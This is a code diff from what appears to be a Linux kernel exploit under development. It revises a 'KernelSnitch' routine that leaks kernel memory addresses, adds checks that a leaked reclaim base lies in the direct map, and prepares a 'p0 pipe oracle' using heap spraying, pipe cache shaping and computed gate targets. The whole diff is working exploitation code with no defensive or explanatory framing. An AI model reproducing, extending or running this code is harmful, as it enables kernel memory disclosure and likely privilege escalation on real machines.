@@ -219,10 +219,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
-  run_kernelsnitch_bruteforce();
-  uintptr_t leaked = cleanup_kernelsnitch();
+  uintptr_t leaked = kernelsnitch_stable_mm_leak();
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    cleanup_kernelsnitch();
     close_ctx_memfds(&prep);
     close_ctx_memfds(&spray);
     close_ctx_memfds(&pre);
@@ -235,10 +235,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  if ((leaked - base) % MM_STRUCT_SZ != 0 || !is_direct_ptr(base) ||
-      !is_direct_ptr(base + ORDER3_SIZE - 1)) {
+  if (!is_plausible_reclaim_base(base)) {
     pr_error("pipe KernelSnitch implausible mm leaked=%016zx base=%016zx\n",
              leaked, base);
+    cleanup_kernelsnitch();
     close_ctx_memfds(&prep);
     close_ctx_memfds(&spray);
     close_ctx_memfds(&pre);
@@ -250,6 +250,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     free(buf);
     return 0;
   }
+  pr_info("pipe KernelSnitch stable leak=%016zx base=%016zx object_index=%zu\n",
+          leaked, base, (leaked - base) / MM_STRUCT_SZ);
+  cleanup_kernelsnitch();
 
   shape_pipe_cache();
 
@@ -936,7 +939,22 @@ int prepare_p0_pipe_oracle(void) {
   p0_gate_holders_initialized = 1;
 
   pipebuf_page_base = prepare_pipe_buffer_page();
-  if (!is_direct_ptr(pipebuf_page_base)) {
+  if (!is_plausible_reclaim_base(pipebuf_page_base)) {
+    pr_error("p0 pipe oracle rejected reclaim base=%016zx\n",
+             pipebuf_page_base);
+    pipebuf_page_base = 0;
+    return 0;
+  }
+
+  uintptr_t gate_target =
+      pipebuf_page_base +
+      (uintptr_t)P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+  if (!is_direct_ptr(gate_target) ||
+      !is_direct_ptr(gate_target + PIPE_OBJECT_SIZE - 1)) {
+    pr_error("p0 pipe oracle gate target not in direct map target=%016zx "
+             "base=%016zx\n",
+             gate_target, pipebuf_page_base);
+    pipebuf_page_base = 0;
     return 0;
   }
 
@@ -949,8 +967,10 @@ int prepare_p0_pipe_oracle(void) {
       return 0;
     }
   }
-  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
-          pipebuf_page_base, PIPE_RECLAIM);
+  pr_info("p0 pipe oracle prepared base=%016zx gate_target=%016zx "
+          "gate_index=%d obj_size=0x%x pipes=%d gate_slots=1\n",
+          pipebuf_page_base, gate_target, P0_ORACLE_GATE_OBJECT_INDEX,
+          (unsigned)PIPE_OBJECT_SIZE, PIPE_RECLAIM);
   return 1;
 }
 
